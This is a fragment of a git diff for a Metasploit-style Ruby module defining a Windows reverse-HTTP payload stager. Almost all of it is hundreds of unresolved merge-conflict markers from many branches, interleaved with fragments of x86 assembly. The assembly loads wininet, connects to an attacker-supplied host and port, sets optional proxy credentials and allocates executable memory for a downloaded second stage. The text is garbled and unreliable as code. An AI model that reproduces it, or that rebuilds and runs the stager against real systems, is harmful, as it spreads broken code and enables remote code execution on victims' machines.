+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+    end
+
+    asm = %Q^
+      ;-----------------------------------------------------------------------------;
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1379,11 +2171,22 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 =======
+      ; Author: HD Moore
+      ; Compatible: Confirmed Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
+      ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
+      ; Version: 1.0
+      ;-----------------------------------------------------------------------------;
+
+      ; Input: EBP must be the address of 'api_call'.
+      ; Output: EDI will be the socket for the connection to the server
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
 =======
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> feature/complex-payloads
 =======
@@ -1408,6 +2211,46 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+      ; Compatible: Confirmed Windows 8.1, Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
+      ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
+      ;-----------------------------------------------------------------------------;
+
+      ; Input: EBP must be the address of 'api_call'.
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> rapid7/master
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
@@ -1420,6 +2263,43 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> rapid7/master
 =======
+=======
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
+      load_wininet:
+        push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
+        push 0x696e6977        ; ...
+        push esp               ; Push a pointer to the "wininet" string on the stack.
+        push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
+        call ebp               ; LoadLibraryA( "wininet" )
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1446,6 +2326,31 @@ module Payload::Windows::ReverseHttp
     # Generate a random 30+ byte URI
     "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW, 30 + rand(uri_max_len-30))
 =======
+
+      set_retry:
+        push.i8 8              ; retry 8 times should be enough
+        pop edi
+        xor ebx, ebx           ; push 8 zeros ([1]-[8])
+        mov ecx, edi
+      push_zeros:
+        push ebx
+        loop push_zeros
+
+      internetopen:
+                               ; DWORD dwFlags [1]
+                               ; LPCTSTR lpszProxyBypass (NULL) [2]
+                               ; LPCTSTR lpszProxyName (NULL) [3]
+                               ; DWORD dwAccessType (PRECONFIG = 0) [4]
+                               ; LPCTSTR lpszAgent (NULL) [5]
+        push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
+        call ebp
+
+      internetconnect:
+                               ; DWORD_PTR dwContext (NULL) [6]
+                               ; dwFlags [7]
+        push.i8 3              ; DWORD dwService (INTERNET_SERVICE_HTTP)
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 =======
 >>>>>>> rapid7/master
 =======
@@ -1470,6 +2375,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> master
+<<<<<<< HEAD
 =======
 >>>>>>> rapid7/master
 
@@ -1492,6 +2398,44 @@ module Payload::Windows::ReverseHttp
   #
   def generate_small_uri
     generate_uri_uuid_mode(:init_native, 5)
+=======
+        xor ebx, ebx           ; Set ebx to NULL to use in future arguments
+      ^
+
+    if proxy_enabled
+      asm << %Q^
+      internetopen:
+        push ebx               ; DWORD dwFlags
+        push esp               ; LPCTSTR lpszProxyBypass ("" = empty string)
+      call get_proxy_server
+        db "#{proxy_info}", 0x00
+      get_proxy_server:
+                               ; LPCTSTR lpszProxyName (via call)
+        push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY = 3)
+        push ebx               ; LPCTSTR lpszAgent (NULL)
+        push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
+        call ebp
+      ^
+    else
+      asm << %Q^
+      internetopen:
+        push ebx               ; DWORD dwFlags
+        push ebx               ; LPCTSTR lpszProxyBypass (NULL)
+        push ebx               ; LPCTSTR lpszProxyName (NULL)
+        push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
+        push ebx               ; LPCTSTR lpszAgent (NULL)
+        push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
+        call ebp
+      ^
+    end
+
+    asm << %Q^
+      internetconnect:
+        push ebx               ; DWORD_PTR dwContext (NULL)
+        push ebx               ; dwFlags
+        push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1500,6 +2444,9 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1521,18 +2468,35 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 >>>>>>> master
 =======
 >>>>>>> master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 >>>>>>> pod/metasploit-gemfile-
 >>>>>>> origin/pod/metasploit-framework
 =======
->>>>>>> master
+>>>>>>> origin/pod/metasploit-gemfile-
 =======
 >>>>>>> master
 =======
+>>>>>>> master
+=======
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> rapid7/master
 >>>>>>> origin/payload-generator.rb
@@ -1544,14 +2508,50 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> rapid7/master
 =======
+>>>>>>> master
+=======
+>>>>>>> master
+        push ebx               ; password (NULL)
+        push ebx               ; username (NULL)
+        push #{opts[:port]}    ; PORT
+        call got_server_uri    ; double call to get pointer for both server_uri and
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+      server_uri:              ;  server_host; server_uri is saved in EDI for later
+        db "#{opts[:url]}", 0x00
+      got_server_host:
+        push eax               ; HINTERNET hInternet
+        push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
+        call ebp
+
+      httpopenrequest:
+                               ; dwContext (NULL) [8]
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 >>>>>>> origin/pod/metasploit-api/_index.html
@@ -1569,16 +2569,26 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> master
 =======
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 >>>>>>> master
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 >>>>>>> master
 =======
 >>>>>>> master
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> pod/metasploit-gemfile-
 =======
@@ -1679,6 +2689,58 @@ module Payload::Windows::ReverseHttp
     # Add 100 bytes for the encoder to have some room
     space += 100
 
+=======
+=======
+>>>>>>> master
+      server_uri:              ; server_host; server_uri is saved in EDI for later
+        db "#{opts[:url]}", 0x00
+      got_server_host:
+        push eax               ; HINTERNET hInternet (still in eax from InternetOpenA)
+        push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
+        call ebp
+        mov esi, eax           ; Store hConnection in esi
+      ^
+
+    # Note: wine-1.6.2 does not support SSL w/proxy authentication properly, it
+    # doesn't set the Proxy-Authorization header on the CONNECT request.
+
+    if proxy_enabled && proxy_user
+      asm << %Q^
+        ; DWORD dwBufferLength (length of username)
+        push #{proxy_user.length}
+        call set_proxy_username
+      proxy_username:
+        db "#{proxy_user}",0x00
+      set_proxy_username:
+                             ; LPVOID lpBuffer (username from previous call)
+        push 43              ; DWORD dwOption (INTERNET_OPTION_PROXY_USERNAME)
+        push esi             ; hConnection
+        push 0x869E4675      ; hash( "wininet.dll", "InternetSetOptionA" )
+        call ebp
+      ^
+    end
+
+    if proxy_enabled && proxy_pass
+      asm << %Q^
+        ; DWORD dwBufferLength (length of password)
+        push #{proxy_pass.length}
+        call set_proxy_password
+      proxy_password:
+        db "#{proxy_pass}",0x00
+      set_proxy_password:
+                             ; LPVOID lpBuffer (password from previous call)
+        push 44              ; DWORD dwOption (INTERNET_OPTION_PROXY_PASSWORD)
+        push esi             ; hConnection
+        push 0x869E4675      ; hash( "wininet.dll", "InternetSetOptionA" )
+        call ebp
+      ^
+    end
+
+    asm << %Q^
+      httpopenrequest:
+        push ebx               ; dwContext (NULL)
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1780,6 +2842,12 @@ module Payload::Windows::ReverseHttp
     Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
   end
 =======
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1848,6 +2916,40 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+        push #{"0x%.8x" % http_open_flags}   ; dwFlags
+        push ebx               ; accept types
+        push ebx               ; referrer
+        push ebx               ; version
+        push edi               ; server URI
+        push ebx               ; method
+>>>>>>> origin/pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -6055,6 +7157,64 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> origin/pod/metasploit-framework
 =======
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+        push eax               ; hConnection
+=======
+        push esi               ; hConnection
+>>>>>>> rapid7/master
+=======
+        push esi               ; hConnection
+>>>>>>> rapid7/master
+=======
+        push esi               ; hConnection
+>>>>>>> rapid7/master
+=======
+        push esi               ; hConnection
+>>>>>>> rapid7/master
+=======
+        push esi               ; hConnection
+>>>>>>> rapid7/master
+=======
+        push esi               ; hConnection
+>>>>>>> rapid7/master
+=======
+        push esi               ; hConnection
+>>>>>>> master
+=======
+        push esi               ; hConnection
+>>>>>>> master
+=======
+        push esi               ; hConnection
+>>>>>>> rapid7/master
+=======
+        push esi               ; hConnection
+>>>>>>> master
+=======
+        push esi               ; hConnection
+>>>>>>> master
+=======
+        push esi               ; hConnection
+>>>>>>> master
+=======
+        push esi               ; hConnection
+>>>>>>> master
+        push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
+        call ebp
+        xchg esi, eax          ; save hHttpRequest in esi
+
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -6108,8 +7268,11 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> master
+<<<<<<< HEAD
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
       ; Store our retry counter in the edi register
       set_retry:
         push #{retry_count}
@@ -6144,6 +7307,9 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -6169,8 +7335,11 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> master
+<<<<<<< HEAD
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
     end
 
     asm << %Q^
@@ -6197,6 +7366,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -6213,6 +7383,14 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
       ^
 
       if opts[:exitfunk]
@@ -6229,6 +7407,7 @@ module Payload::Windows::ReverseHttp
       end
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-excellent.mp3
@@ -6238,6 +7417,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-framework
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
       asm << %Q^
         allocate_memory:
           push.i8 0x40           ; PAGE_EXECUTE_READWRITE
@@ -6288,9 +7469,12 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 =======
 >>>>>>> rapid7/master
 =======
@@ -6299,6 +7483,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -6309,19 +7494,25 @@ module Payload::Windows::ReverseHttp
 =======
 =======
 =======
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
 =======
 >>>>>>> master
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
 =======
 >>>>>>> master
 =======
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> rapid7/master
 >>>>>>> origin/payload-generator.rb
@@ -6334,6 +7525,11 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> rapid7/master
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> origin/pod/metasploit-gemfile-
     ^
 
     if opts[:exitfunk]
@@ -6347,9 +7543,12 @@ module Payload::Windows::ReverseHttp
       push 0x56A2B5F0        ; hardcoded to exitprocess for size
       call ebp
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
       ^
     end
 
@@ -6401,6 +7600,7 @@ module Payload::Windows::ReverseHttp
       asm << asm_exitfunk(opts)
     end
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -6522,12 +7722,20 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
 =======
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 =======
@@ -6536,11 +7744,14 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-framework
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -6563,6 +7774,9 @@ module Payload::Windows::ReverseHttp
 =======
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
@@ -6570,6 +7784,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/payload-generator.rb
@@ -6598,11 +7813,16 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
+=======
 >>>>>>> master
+>>>>>>> origin/pod/metasploit-gemfile-
 =======
 >>>>>>> master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> pod/metasploit-gemfile-
 =======
@@ -6616,6 +7836,8 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> rapid7/master
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
     asm
   end
 
@@ -6642,6 +7864,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 
 >>>>>>> rapid7/feature/complex-payloads
@@ -6700,6 +7923,10 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-framework
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 
@@ -6713,6 +7940,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -6733,6 +7961,8 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
@@ -6740,6 +7970,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/payload-generator.rb
@@ -6762,11 +7993,16 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
+=======
 >>>>>>> master
+>>>>>>> origin/pod/metasploit-gemfile-
 =======
 >>>>>>> master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> pod/metasploit-gemfile-
 =======
@@ -6780,6 +8016,8 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> rapid7/master
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
 end
 
 end
